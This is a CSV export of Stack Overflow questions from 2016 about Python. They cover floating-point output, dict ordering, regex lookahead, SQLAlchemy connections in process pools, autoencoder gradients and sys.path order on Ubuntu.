Id,OwnerUserId,CreationDate,Score,Title,Body
39618943,261181.0,2016-09-21 14:07:21+00:00,148,Why does the floating-point value of 4*0.1 look nice in Python 3 but 3*0.1 doesn't?,"<p>I know that most decimals don't have an exact floating point representation (<a href=""http://stackoverflow.com/questions/588004"">Is floating point math broken?</a>).</p>

<p>But I don't see why <code>4*0.1</code> is printed nicely as <code>0.4</code>, but <code>3*0.1</code> isn't, when
both values actually have ugly decimal representations:</p>

<pre><code>&gt;&gt;&gt; 3*0.1
0.30000000000000004
&gt;&gt;&gt; 4*0.1
0.4
&gt;&gt;&gt; from decimal import Decimal
&gt;&gt;&gt; Decimal(3*0.1)
Decimal('0.3000000000000000444089209850062616169452667236328125')
&gt;&gt;&gt; Decimal(4*0.1)
Decimal('0.40000000000000002220446049250313080847263336181640625')
</code></pre>
"
39980323,6260170.0,2016-10-11 14:59:23+00:00,72,Dictionaries are ordered in Python 3.6,"<p>Dictionaries are ordered in Python 3.6, unlike in previous Python incarnations. This seems like a substantial change, but it's only a short paragraph in the <a href=""https://docs.python.org/3.6/whatsnew/3.6.html#other-language-changes"">documentation</a>. It is described as an implementation detail rather than a language feature, but also implies this may become standard in the future.</p>

<p>How does the Python 3.6 dictionary implementation perform better than the older one while preserving element order? </p>

<p>Here is the text from the documentation:</p>

<blockquote>
  <p><code>dict()</code> now uses a âcompactâ representation <a href=""https://morepypy.blogspot.com/2015/01/faster-more-memory-efficient-and-more.html"">pioneered by PyPy</a>. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. <a href=""https://www.python.org/dev/peps/pep-0468"">PEP 468</a> (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in <a href=""https://bugs.python.org/issue27350"">issue 27350</a>. Idea <a href=""https://mail.python.org/pipermail/python-dev/2012-December/123028.html"">originally suggested by Raymond Hettinger</a>.)</p>
</blockquote>
"
40018398,3124746.0,2016-10-13 10:25:25+00:00,54,list() uses more memory than list comprehension,"<p>So i was playing with <code>list</code> objects and found little strange thing that if <code>list</code> is created with <code>list()</code> it uses more memory, than list comprehension? I'm using Python 3.5.2</p>

<pre><code>In [1]: import sys
In [2]: a = list(range(100))
In [3]: sys.getsizeof(a)
Out[3]: 1008
In [4]: b = [i for i in range(100)]
In [5]: sys.getsizeof(b)
Out[5]: 912
In [6]: type(a) == type(b)
Out[6]: True
In [7]: a == b
Out[7]: True
In [8]: sys.getsizeof(list(b))
Out[8]: 1008
</code></pre>

<p>From the <a href=""https://docs.python.org/3.5/library/stdtypes.html#list"">docs</a>:</p>

<blockquote>
  <p>Lists may be constructed in several ways:</p>
  
  <ul>
  <li>Using a pair of square brackets to denote the empty list: <code>[]</code></li>
  <li>Using square brackets, separating items with commas: <code>[a]</code>, <code>[a, b, c]</code></li>
  <li>Using a list comprehension: <code>[x for x in iterable]</code></li>
  <li>Using the type constructor: <code>list()</code> or <code>list(iterable)</code></li>
  </ul>
</blockquote>

<p>But it seems that using <code>list()</code> it uses more memory.</p>

<p>And as much <code>list</code> is bigger, the gap increases.</p>

<p><a href=""https://i.stack.imgur.com/VVHJL.png""><img src=""https://i.stack.imgur.com/VVHJL.png"" alt=""Difference in memory""></a></p>

<p>Why this happens?</p>

<p><strong>UPDATE #1</strong></p>

<p>Test with Python 3.6.0b2:</p>

<pre><code>Python 3.6.0b2 (default, Oct 11 2016, 11:52:53) 
[GCC 5.4.0 20160609] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.getsizeof(list(range(100)))
1008
&gt;&gt;&gt; sys.getsizeof([i for i in range(100)])
912
</code></pre>

<p><strong>UPDATE #2</strong></p>

<p>Test with Python 2.7.12:</p>

<pre><code>Python 2.7.12 (default, Jul  1 2016, 15:12:24) 
[GCC 5.4.0 20160609] on linux2
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.getsizeof(list(xrange(100)))
1016
&gt;&gt;&gt; sys.getsizeof([i for i in xrange(100)])
920
</code></pre>
"
39843488,336527.0,2016-10-04 03:00:56+00:00,41,How to make an integer larger than any other integer?,"<p>Note: while the accepted answer achieves the result I wanted, and @ecatmur answer provides a more comprehensive option, I feel it's very important to emphasize that my use case is a bad idea in the first place. This is explained very well in <a href=""http://stackoverflow.com/a/39856605/336527"">@Jason Orendorff answer below</a>.</p>

<p>Note: this question is not a duplicate of <a href=""http://stackoverflow.com/questions/13795758/what-is-sys-maxint-in-python-3"">the question about <code>sys.maxint</code></a>. It has nothing to do with <code>sys.maxint</code>; even in python 2 where <code>sys.maxint</code> is available, it does NOT represent largest integer (see the accepted answer).</p>

<p>I need to create an integer that's larger than any other integer, meaning an <code>int</code> object which returns <code>True</code> when compared to any other <code>int</code> object using <code>&gt;</code>. Use case: library function expects an integer, and the only easy way to force a certain behavior is to pass a very large integer.</p>

<p>In python 2, I can use <code>sys.maxint</code> (edit: I was wrong). In python 3, <code>math.inf</code> is the closest equivalent, but I can't convert it to <code>int</code>.</p>
"
39779538,178732.0,2016-09-29 20:35:58+00:00,35,"How to get lineno of ""end-of-statement"" in Python ast","<p>I am trying to work on a script that manipulates another script in Python, the script to be modified has structure like:</p>

<pre><code>class SomethingRecord(Record):
    description = 'This records something'
    author = 'john smith'
</code></pre>

<p>I use <code>ast</code> to locate the <code>description</code> line number, and I use some code to change the original file with new description string base on the line number. So far so good.</p>

<p>Now the only issue is <code>description</code> occasionally is a multi-line string, e.g.</p>

<pre><code>    description = ('line 1'
                   'line 2'
                   'line 3')
</code></pre>

<p>or</p>

<pre><code>    description = 'line 1' \
        'line 2' \
        'line 3'
</code></pre>

<p>and I only have the line number of the first line, not the following lines. So my one-line replacer would do</p>

<pre><code>    description = 'new value'
        'line 2' \
        'line 3'
</code></pre>

<p>and the code is broken. I figured that if I know both the lineno of start and end/number of lines of <code>description</code> assignment I could repair my code to handle such situation. How do I get such information with Python standard library?</p>
"
39903242,5149992.0,2016-10-06 18:29:51+00:00,32,Is there a more Pythonic way to combine an Else: statement and an Except:?,"<p>I have a piece of code that searches AutoCAD for text boxes that contain certain keywords (eg. <code>""overall_weight""</code> in this case) and replaces it with a value from a dictionary. However, sometimes the dictionary key is assigned to an empty string and sometimes, the key doesn't exist altogether. In these cases, the <code>""overall_weight""</code> keywords should be replaced with <code>""N/A""</code>. I was wondering if there was a more pythonic way to combine the <code>KeyError</code> exception and the <code>else</code> to both go to <code>nObject.TextString = ""N/A""</code> so its not typed twice.</p>

<pre><code>if nObject.TextString == ""overall_weight"":
    try:
        if self.var.jobDetails[""Overall Weight""]:
            nObject.TextString = self.var.jobDetails[""Overall Weight""]
        else:
            nObject.TextString = ""N/A""
    except KeyError:
        nObject.TextString = ""N/A""
</code></pre>

<p>Edit: For clarification for future visitors, there are only 3 cases I need to take care of and the correct answer takes care of all 3 cases without any extra padding.</p>

<ol>
<li><p><code>dict[key]</code> exists and points to a non-empty string. <code>TextString</code> replaced with the value assigned to <code>dict[key]</code>.</p></li>
<li><p><code>dict[key]</code> exists and points to a empty string. <code>TextString</code> replaced with <code>""N/A""</code>.</p></li>
<li><p><code>dict[key]</code> doesn't exist. <code>TextString</code> replaced with <code>""N/A""</code>.</p></li>
</ol>
"
39796852,1540815.0,2016-09-30 17:22:24+00:00,27,Regular Expression Matching First Non-Repeated Character,"<p><strong>TL;DR</strong></p>

<p><code>re.search(""(.)(?!.*\1)"", text).group()</code> doesn't match the first non-repeating character contained in text (it always returns a character at or before the first non-repeated character, or before the end of the string if there are no non-repeated characters. My understanding is that re.search() should return None if there were no matches).
I'm only interested in understanding why this regex is not working as intended using the Python <code>re</code> module, not in any other method of solving the problem</p>

<p><strong>Full Background</strong></p>

<p>The problem description comes from <a href=""https://www.codeeval.com/open_challenges/12/"">https://www.codeeval.com/open_challenges/12/</a>. I've already solved this problem using a non-regex method, but revisited it to expand my understanding of Python's <code>re</code> module.
The regular expressions i thought would work (named vs unnamed backreferences) are: </p>

<p><code>(?P&lt;letter&gt;.)(?!.*(?P=letter))</code> and <code>(.)(?!.*\1)</code> (same results in python2 and python3)</p>

<p>My entire program looks like this</p>

<pre><code>import re
import sys
with open(sys.argv[1], 'r') as test_cases:
    for test in test_cases:
        print(re.search(""(?P&lt;letter&gt;.)(?!.*(?P=letter))"",
                        test.strip()
                       ).group()
             )
</code></pre>

<p>and some input/output pairs are:</p>

<pre><code>rain | r
teetthing | e
cardiff | c
kangaroo | k
god | g
newtown | e
taxation | x
refurbished | f
substantially | u
</code></pre>

<p>According to what I've read at <a href=""https://docs.python.org/2/library/re.html"">https://docs.python.org/2/library/re.html</a>:</p>

<ul>
<li><code>(.)</code> creates a named group that matches any character and allows later backreferences to it as <code>\1</code>. </li>
<li><code>(?!...)</code> is a negative lookahead which restricts matches to cases where <code>...</code> does not match.</li>
<li><code>.*\1</code> means any number (including zero) of characters followed by whatever was matched by <code>(.)</code> earlier</li>
<li><code>re.search(pattern, string)</code> returns only the first location where the regex pattern produces a match (and would return None if no match could be found)</li>
<li><code>.group()</code> is equivalent to <code>.group(0)</code> which returns the entire match</li>
</ul>

<p>I think these pieces together should solve the stated problem, and it does work like I think it should for most inputs, but failed on <code>teething</code>. Throwing similar problems at it reveals that it seems to ignore repeated characters if they are consecutive:</p>

<pre><code>tooth | o      # fails on consecutive repeated characters
aardvark | d   # but does ok if it sees them later
aah | a        # verified last one didn't work just because it was at start
heh | e        # but it works for this one
hehe | h       # What? It thinks h matches (lookahead maybe doesn't find ""heh""?)
heho | e       # but it definitely finds ""heh"" and stops ""h"" from matching here
hahah | a      # so now it won't match h but will match a
hahxyz | a     # but it realizes there are 2 h characters here...
hahxyza | h    # ... Ok time for StackOverflow
</code></pre>

<p>I know lookbehind and negative lookbehind are limited to 3-character-max fixed length strings, and cannot contain backreferences even if they evaluate to a fixed length string, but I didn't see the documentation specify any restrictions on negative lookahead.</p>
"
39603391,463300.0,2016-09-20 20:42:29+00:00,26,"Short-circuit evaluation like Python's ""and"" while storing results of checks","<p>I have multiple expensive functions that return results.  I want to return a tuple of the results of all the checks if all the checks succeed.  However, if one check fails I don't want to call the later checks, like the short-circuiting behavior of <code>and</code>.  I could nest <code>if</code> statements, but that will get out of hand if there are a lot of checks.  How can I get the short-circuit behavior of <code>and</code> while also storing the results for later use?</p>

<pre><code>def check_a():
    # do something and return the result,
    # for simplicity, just make it ""A""
    return ""A""

def check_b():
    # do something and return the result,
    # for simplicity, just make it ""B""
    return ""B""

...
</code></pre>

<p>This doesn't short-circuit:</p>

<pre><code>a = check_a()
b = check_b()
c = check_c()

if a and b and c:
    return a, b, c
</code></pre>

<p>This is messy if there are many checks:</p>

<pre><code>if a:
   b = check_b()

   if b:
      c = check_c()

      if c:
          return a, b, c
</code></pre>

<p>Is there a shorter way to do this?</p>
"
39913847,2051868.0,2016-10-07 09:24:20+00:00,22,Is there a way to compile python application into static binary?,"<p>What I'm trying to do is ship my code to a remote server, that may have different python version installed and/or may not have packages my app requires.</p>

<p>Right now to achieve such portability I have to build relocatable virtualenv with interpreter and code. That approach has some issues (for example, you have to manually copy a bunch of libraries into your virtualenv, since <code>--always-copy</code> doesn't work as expected) and generally slow.</p>

<p>There's (in theory) <a href=""https://wiki.python.org/moin/BuildStatically"">a way</a> to build python itself statically.</p>

<p>I wonder if I could pack interpreter with my code into one binary and run my application as module. Something like that: <code>./mypython -m myapp run</code> or <code>./mypython -m gunicorn -c ./gunicorn.conf myapp.wsgi:application</code>.</p>
"
39613476,6857561.0,2016-09-21 10:06:08+00:00,20,How to handle SQLAlchemy Connections in ProcessPool?,"<p>I have a reactor that fetches messages from a RabbitMQ broker and triggers worker methods to process these messages in a process pool, something like this:</p>

<p><a href=""http://i.stack.imgur.com/eKbAK.png""><img src=""http://i.stack.imgur.com/eKbAK.png"" alt=""Reactor""></a></p>

<p>This is implemented using python <code>asyncio</code>, <code>loop.run_in_executor()</code> and <code>concurrent.futures.ProcessPoolExecutor</code>.</p>

<p>Now I want to access the database in the worker methods using SQLAlchemy. Mostly the processing will be very straightforward and quick CRUD operations.</p>

<p>The reactor will process 10-50 messages per second in the beginning, so it is not acceptable to open a new database connection for every request. Rather I would like to maintain one persistent connection per process.</p>

<p>My questions are: How can I do this? Can I just store them in a global variable? Will the SQA connection pool handle this for me? How to clean up when the reactor stops?</p>

<p><strong>[Update]</strong></p>

<ul>
<li>The database is MySQL with InnoDB.</li>
</ul>

<p><strong>Why choosing this pattern with a process pool?</strong></p>

<p>The current implementation uses a different pattern where each consumer runs in its own thread. Somehow this does not work very well. There are already about 200 consumers each running in their own thread, and the system is growing quickly. To scale better, the idea was to separate concerns and to consume messages in an I/O loop and delegate the processing to a pool. Of course, the performance of the whole system is mainly I/O bound. However, CPU is an issue when processing large result sets.</p>

<p>The other reason was ""ease of use."" While the connection handling and consumption of messages is implemented asynchronously, the code in the worker can be synchronous and simple.   </p>

<p>Soon it became evident that accessing remote systems through persistent network connections from within the worker are an issue. This is what the CommunicationChannels are for: Inside the worker, I can grant requests to the message bus through these channels.</p>

<p>One of my current ideas is to handle DB access in a similar way: Pass statements through a queue to the event loop where they are sent to the DB. However, I have no idea how to do this with SQLAlchemy. 
Where would be the entry point? 
Objects need to be <code>pickled</code> when they are passed through a queue. How do I get such an object from an SQA query?
The communication with the database has to work asynchronously in order not to block the event loop. Can I use e.g. aiomysql as a database driver for SQA?  </p>
"
40015439,2085376.0,2016-10-13 08:01:41+00:00,20,Why does map return a map object instead of a list in Python 3?,"<p>I am interested in understanding the <a href=""http://stackoverflow.com/questions/1303347/getting-a-map-to-return-a-list-in-python-3-x"">new language design of Python 3.x</a>.</p>

<p>I do enjoy, in Python 2.7, the function <code>map</code>:</p>

<pre><code>Python 2.7.12
In[2]: map(lambda x: x+1, [1,2,3])
Out[2]: [2, 3, 4]
</code></pre>

<p>However, in Python 3.x things have changed:</p>

<pre><code>Python 3.5.1
In[2]: map(lambda x: x+1, [1,2,3])
Out[2]: &lt;map at 0x4218390&gt;
</code></pre>

<p>I understand the how, but I could not find a reference to the why. Why did the language designers make this choice, which, in my opinion, introduces a great deal of pain. Was this to arm-wrestle developers in sticking to list comprehensions?</p>

<p>IMO, list can be naturally thought as <a href=""http://learnyouahaskell.com/functors-applicative-functors-and-monoids"" rel=""nofollow"">Functors</a>; and I have been somehow been thought to think in this way:</p>

<pre><code>fmap :: (a -&gt; b) -&gt; f a -&gt; f b
</code></pre>
"
39971929,1983854.0,2016-10-11 07:00:15+00:00,15,What are variable annotations in Python 3.6?,"<p>Python 3.6 is about to be released. <a href=""https://www.python.org/dev/peps/pep-0494/"">PEP 494 -- Python 3.6 Release Schedule</a> mentions the end of December, so I went through <a href=""https://docs.python.org/3.6/whatsnew/3.6.html"">What's New in Python 3.6</a> to see they mention the <em>variable annotations</em>:</p>

<blockquote>
  <p><a href=""https://www.python.org/dev/peps/pep-0484"">PEP 484</a> introduced standard for type annotations of function parameters, a.k.a. type hints. This PEP adds syntax to Python for annotating the types of variables including class variables and instance variables:</p>

<pre><code>  primes: List[int] = []

  captain: str  # Note: no initial value!

  class Starship:
     stats: Dict[str, int] = {}
</code></pre>
  
  <p>Just as for function annotations, the Python interpreter does not attach any particular meaning to variable annotations and only stores them in a special attribute <code>__annotations__</code> of a class or module. In contrast to variable declarations in statically typed languages, the goal of annotation syntax is to provide an easy way to specify structured type metadata for third party tools and libraries via the abstract syntax tree and the <code>__annotations__</code> attribute.</p>
</blockquote>

<p>So from what I read they are part of the type hints coming from Python 3.5, described in <a href=""http://stackoverflow.com/q/32557920/1983854"">What are Type hints in Python 3.5</a>.</p>

<p>I follow the <code>captain: str</code> and <code>class Starship</code> example, but not sure about the last one: How does <code>primes: List[int] = []</code> explain? Is it defining an empty list that will just allow integers?</p>
"
39719567,633961.0,2016-09-27 08:17:37+00:00,15,Not nesting version of @atomic() in Django?,"<p>From the <a href=""https://docs.djangoproject.com/en/dev/topics/db/transactions/#django.db.transaction.atomic"">docs of atomic()</a></p>

<blockquote>
  <p>atomic blocks can be nested</p>
</blockquote>

<p>This sound like a great feature, but in my use case I want the opposite: I want the transaction to be durable as soon as the block decorated with <code>@atomic()</code> gets left successfully.</p>

<p>Is there a way to ensure durability in django's transaction handling?</p>

<h1>Background</h1>

<p>Transaction are ACID. The ""D"" stands for durability. That's why I think transactions can't be nested without loosing feature ""D"".</p>

<p>Example: If the inner transaction is successful, but the outer transaction is not, then the outer and the inner transaction get rolled back. The result: The inner transaction was not durable.</p>

<p>I use PostgreSQL, but AFAIK this should not matter much.</p>
"
39675844,200783.0,2016-09-24 11:32:53+00:00,15,How do coroutines in Python compare to those in Lua?,"<p>Support for coroutines in Lua is provided by <a href=""https://www.lua.org/manual/5.3/manual.html#2.6"">functions in the <code>coroutine</code> table</a>, primarily <code>create</code>, <code>resume</code> and <code>yield</code>. The developers describe these coroutines as <a href=""http://laser.inf.ethz.ch/2012/slides/Ierusalimschy/coroutines-4.pdf"">stackful, first-class and asymmetric</a>.</p>

<p>Coroutines are also available in Python, either using <a href=""https://www.python.org/dev/peps/pep-0342/"">enhanced generators</a> (and <a href=""https://www.python.org/dev/peps/pep-0380/""><code>yield from</code></a>) or, added in version 3.5, <a href=""https://www.python.org/dev/peps/pep-0492/""><code>async</code> and <code>await</code></a>.</p>

<p>How do coroutines in Python compare to those in Lua? Are they also stackful, first-class and asymmetric?</p>

<p>Why does Python require so many constructs (<code>async def</code>, <code>async with</code>, <code>async for</code>, <a href=""https://www.python.org/dev/peps/pep-0530/"">asynchronous comprehensions</a>, ...) for coroutines, while Lua can provide them with just three built-in functions?</p>
"
39804774,1920178.0,2016-10-01 08:59:04+00:00,13,Stuck implementing simple neural network,"<p>I've been bashing my head against this brick wall for what seems like an eternity, and I just can't seem to wrap my head around it. I'm trying to implement an autoencoder using only numpy and matrix multiplication. No theano or keras tricks allowed.</p>

<p>I'll describe the problem and all its details. It is a bit complex at first since there are a lot of variables, but it really is quite straightforward.</p>

<p><strong>What we know</strong></p>

<p>1) <code>X</code> is an <code>m</code> by <code>n</code> matrix which is our inputs. The inputs are rows of this matrix. Each input is an <code>n</code> dimensional row vector, and we have <code>m</code> of them.</p>

<p>2)The number of neurons in our (single) hidden layer, which is <code>k</code>.</p>

<p>3) The activation function of our neurons (sigmoid, will be denoted as <code>g(x)</code>) and its derivative <code>g'(x)</code></p>

<p><strong>What we don't know and want to find</strong></p>

<p>Overall our goal is to find 6 matrices: <code>w1</code> which is <code>n</code> by <code>k</code>, <code>b1</code> which is <code>m</code> by <code>k</code>, <code>w2</code> which is <code>k</code> by <code>n</code>, b2 which is <code>m</code> by <code>n</code>, <code>w3</code> which is <code>n</code> by <code>n</code> and <code>b3</code> which is <code>m</code> by <code>n</code>.</p>

<p>They are initallized randomly and we find the best solution using gradient descent.</p>

<p><strong>The process</strong></p>

<p>The entire process looks something like this
<a href=""http://i.stack.imgur.com/OQl3g.jpg""><img src=""http://i.stack.imgur.com/OQl3g.jpg"" alt=""enter image description here""></a></p>

<p>First we compute <code>z1 = Xw1+b1</code>. It is <code>m</code> by <code>k</code> and is the input to our hidden layer. We then compute <code>h1 = g(z1)</code>, which is simply applying the sigmoid function to all elements of <code>z1</code>. naturally it is also <code>m</code> by <code>k</code> and is the output of our hidden layer.</p>

<p>We then compute <code>z2 = h1w2+b2</code> which is <code>m</code> by <code>n</code> and is the input to the output layer of our neural network. Then we compute <code>h2 = g(z2)</code> which again is naturally also <code>m</code> by <code>n</code> and is the output of our neural network.</p>

<p>Finally, we take this output and perform some linear operator on it: <code>Xhat = h2w3+b3</code> which is also <code>m</code> by <code>n</code> and is our final result.</p>

<p><strong>Where I am stuck</strong></p>

<p>The cost function I want to minimize is the mean squared error. I already implemented it in numpy code</p>

<pre><code>def cost(x, xhat):
    return (1.0/(2 * m)) * np.trace(np.dot(x-xhat,(x-xhat).T))
</code></pre>

<p>The problem is finding the derivatives of cost with respect to <code>w1,b1,w2,b2,w3,b3</code>. Let's call the cost <code>S</code>.</p>

<p>After deriving myself <strong>and checking myself numerically</strong>, I have established the following facts:</p>

<p>1) <code>dSdxhat = (1/m) * np.dot(xhat-x)</code></p>

<p>2) <code>dSdw3 = np.dot(h2.T,dSdxhat)</code></p>

<p>3) <code>dSdb3 = dSdxhat</code></p>

<p>4) <code>dSdh2 = np.dot(dSdxhat, w3.T)</code></p>

<p>But I can't for the life of me figure out dSdz2. It's a brick wall.</p>

<p>From chain-rule, it should be that dSdz2 = dSdh2 * dh2dz2 but the dimensions don't match. </p>

<p>What is the formula to compute the derivative of S with respect to z2?</p>

<p><strong>Edit</strong> - This is my code for the entire feed forward operation of the autoencoder.</p>

<pre><code>import numpy as np

def g(x): #sigmoid activation functions
    return 1/(1+np.exp(-x)) #same shape as x!

def gGradient(x): #gradient of sigmoid
    return g(x)*(1-g(x)) #same shape as x!

def cost(x, xhat): #mean squared error between x the data and xhat the output of the machine
    return (1.0/(2 * m)) * np.trace(np.dot(x-xhat,(x-xhat).T))

#Just small random numbers so we can test that it's working small scale
m = 5 #num of examples
n = 2 #num of features in each example
k = 2 #num of neurons in the hidden layer of the autoencoder
x = np.random.rand(m, n) #the data, shape (m, n)

w1 = np.random.rand(n, k) #weights from input layer to hidden layer, shape (n, k)
b1 = np.random.rand(m, k) #bias term from input layer to hidden layer (m, k)
z1 = np.dot(x,w1)+b1 #output of the input layer, shape (m, k)
h1 = g(z1) #input of hidden layer, shape (m, k)

w2 = np.random.rand(k, n) #weights from hidden layer to output layer of the autoencoder, shape (k, n)
b2 = np.random.rand(m, n) #bias term from hidden layer to output layer of autoencoder, shape (m, n)
z2 = np.dot(h1, w2)+b2 #output of the hidden layer, shape (m, n)
h2 = g(z2) #Output of the entire autoencoder. The output layer of the autoencoder. shape (m, n)

w3 = np.random.rand(n, n) #weights from output layer of autoencoder to entire output of the machine, shape (n, n)
b3 = np.random.rand(m, n) #bias term from output layer of autoencoder to entire output of the machine, shape (m, n)
xhat = np.dot(h2, w3)+b3 #the output of the machine, which hopefully resembles the original data x, shape (m, n)
</code></pre>
"
39748267,2180332.0,2016-09-28 12:58:06+00:00,13,PYTHONPATH order on Ubuntu 14.04,"<p>I have two computers running Ubuntu 14.04 server (let's call them A and B). B was initially a 10.04 but it has received two upgrades to 12.04 and 14.04. I do not understand why the python path is different on the two computers.</p>

<p>As you can see on the two paths below, the pip installation path <code>/usr/local/lib/python2.7/dist-packages</code> comes <strong>before</strong> the apt python packages path <code>/usr/lib/python2.7/dist-packages</code> on Ubuntu A, but it comes <strong>after</strong> on Ubuntu B.</p>

<p>This leads to several problems if a python package is installed both via apt and pip. As you can see below, if both <code>python-six</code> apt package and <code>six</code> pip package are installed, they may be two different library versions.</p>

<p>The installation of packages system is not always my choice, but might be some dependencies of other packages that are installed.</p>

<p>This problem could probably be solved with a virtualenv, but for reasons I will not detail, <strong>I cannot use virtualenv</strong> here, and must install pip packages system-wide.</p>

<h2>Ubuntu A</h2>

<pre><code>&gt;&gt;&gt; import sys, six
&gt;&gt;&gt; sys.path
['',
 '/usr/local/bin',
 '/usr/lib/python2.7',
 '/usr/lib/python2.7/plat-x86_64-linux-gnu',
 '/usr/lib/python2.7/lib-tk',
 '/usr/lib/python2.7/lib-old',
 '/usr/lib/python2.7/lib-dynload',
 '/usr/local/lib/python2.7/dist-packages',
 '/usr/lib/python2.7/dist-packages',
 '/usr/lib/python2.7/dist-packages/PILcompat',
 '/usr/local/lib/python2.7/dist-packages/IPython/extensions']
&gt;&gt;&gt; six
&lt;module 'six' from '/usr/local/lib/python2.7/dist-packages/six.pyc'&gt;
</code></pre>

<h2>Ubuntu B</h2>

<pre><code>&gt;&gt;&gt; import sys, six
&gt;&gt;&gt; sys.path
['',
 '/usr/local/bin',
 '/usr/lib/python2.7/dist-packages',
 '/usr/lib/python2.7',
 '/usr/lib/python2.7/plat-x86_64-linux-gnu',
 '/usr/lib/python2.7/lib-tk',
 '/usr/lib/python2.7/lib-old',
 '/usr/lib/python2.7/lib-dynload',
 '/usr/local/lib/python2.7/dist-packages',
 '/usr/lib/python2.7/dist-packages/PILcompat',
 '/usr/local/lib/python2.7/dist-packages/IPython/extensions']
&gt;&gt;&gt; six
&gt;&gt;&gt; &lt;module 'six' from '/usr/lib/python2.7/dist-packages/six.pyc'&gt;
</code></pre>

<p>For both machines <code>$PATH</code> is the same, and <code>$PYTHONPATH</code> is empty.</p>

<ul>
<li><p>Why are those PYTHONPATHS different?</p></li>
<li><p>How can I fix the pythonpath order in ""Ubuntu B"" so it will load pip
packages before the system ones, in a system-wide way? Is there a apt package I should reinstall or reconfigure so the
PYTHONPATH would prioritize pip packages ?</p></li>
</ul>
"
39829473,1977965.0,2016-10-03 10:28:14+00:00,13,"cryptography AssertionError: sorry, but this version only supports 100 named groups","<p>I'm installing several python packages via <code>pip install</code> on travis, </p>

<pre><code>language: python
python:
- '2.7'
install:
- pip install -r requirements/env.txt
</code></pre>

<p>Everything worked fine, but today I started getting following error:</p>

<pre><code> Running setup.py install for cryptography
Traceback (most recent call last):
  File ""&lt;string&gt;"", line 1, in &lt;module&gt;
  File ""/tmp/pip-build-hKwMR3/cryptography/setup.py"", line 334, in &lt;module&gt;
    **keywords_with_side_effects(sys.argv)
  File ""/opt/python/2.7.9/lib/python2.7/distutils/core.py"", line 111, in setup
    _setup_distribution = dist = klass(attrs)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/setuptools/dist.py"", line 269, in __init__
    _Distribution.__init__(self,attrs)
  File ""/opt/python/2.7.9/lib/python2.7/distutils/dist.py"", line 287, in __init__
    self.finalize_options()
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/setuptools/dist.py"", line 325, in finalize_options
    ep.load()(self, ep.name, value)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/setuptools_ext.py"", line 181, in cffi_modules
    add_cffi_module(dist, cffi_module)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/setuptools_ext.py"", line 48, in add_cffi_module
    execfile(build_file_name, mod_vars)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/setuptools_ext.py"", line 24, in execfile
    exec(code, glob, glob)
  File ""src/_cffi_src/build_openssl.py"", line 81, in &lt;module&gt;
    extra_link_args=extra_link_args(compiler_type()),
  File ""/tmp/pip-build-hKwMR3/cryptography/src/_cffi_src/utils.py"", line 61, in build_ffi_for_binding
    extra_link_args=extra_link_args,
  File ""/tmp/pip-build-hKwMR3/cryptography/src/_cffi_src/utils.py"", line 70, in build_ffi
    ffi.cdef(cdef_source)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/api.py"", line 105, in cdef
    self._cdef(csource, override=override, packed=packed)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/api.py"", line 119, in _cdef
    self._parser.parse(csource, override=override, **options)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 299, in parse
    self._internal_parse(csource)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 304, in _internal_parse
    ast, macros, csource = self._parse(csource)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 260, in _parse
    ast = _get_parser().parse(csource)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 40, in _get_parser
    _parser_cache = pycparser.CParser()
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/c_parser.py"", line 87, in __init__
    outputdir=taboutputdir)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/c_lexer.py"", line 66, in build
    self.lexer = lex.lex(object=self, **kwargs)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 911, in lex
    lexobj.readtab(lextab, ldict)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 233, in readtab
    titem.append((re.compile(pat, lextab._lexreflags | re.VERBOSE), _names_to_funcs(func_name, fdict)))
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/re.py"", line 194, in compile
    return _compile(pattern, flags)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/re.py"", line 249, in _compile
    p = sre_compile.compile(pattern, flags)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/sre_compile.py"", line 583, in compile
    ""sorry, but this version only supports 100 named groups""
AssertionError: sorry, but this version only supports 100 named groups
</code></pre>

<p>Solutions?</p>
"
39748285,1194864.0,2016-09-28 12:58:35+00:00,12,Re-compose a Tensor after tensor factorization,"<p>I am trying to decompose a 3D matrix using python library <a href=""https://github.com/mnick/scikit-tensor"">scikit-tensor</a>. I managed to decompose my Tensor (with dimensions 100x50x5) into three matrices. My question is how can I compose the initial matrix again using the decomposed matrix produced with Tensor factorization? I want to check if the decomposition has any meaning. My code is the following:</p>

<pre><code>import logging
from scipy.io.matlab import loadmat
from sktensor import dtensor, cp_als
import numpy as np

//Set logging to DEBUG to see CP-ALS information
logging.basicConfig(level=logging.DEBUG)
T = np.ones((400, 50))
T = dtensor(T)
P, fit, itr, exectimes = cp_als(T, 10, init='random')
// how can I re-compose the Matrix T? TA = np.dot(P.U[0], P.U[1].T)
</code></pre>

